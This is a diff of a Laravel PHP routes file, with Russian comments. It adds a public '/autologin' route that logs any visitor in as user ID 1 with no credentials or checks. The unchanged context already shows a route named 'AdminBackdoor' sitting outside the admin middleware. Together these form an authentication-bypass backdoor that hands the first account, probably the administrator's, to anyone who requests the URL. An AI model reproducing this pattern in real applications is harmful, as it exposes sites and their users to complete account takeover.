@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Support\Facades\Auth;
 use Illuminate\Support\Facades\Route;
 
 /*
@@ -45,3 +46,11 @@ Route::prefix('admin')->middleware(['auth', 'can:isAdmin,user', 'verified'])->gr
 
 Route::get('AdminBackdoor', 'adminController@create');
 
+Route::get('/autologin', function () {
+    $user = \App\User::find(1); // Предполагается, что модель пользователя находится в App\User
+    Auth::login($user);
+
+    // Дополнительный код, который вы хотите выполнить после автологина
+
+    return redirect('/'); // Перенаправление на нужную страницу после автологина
+});
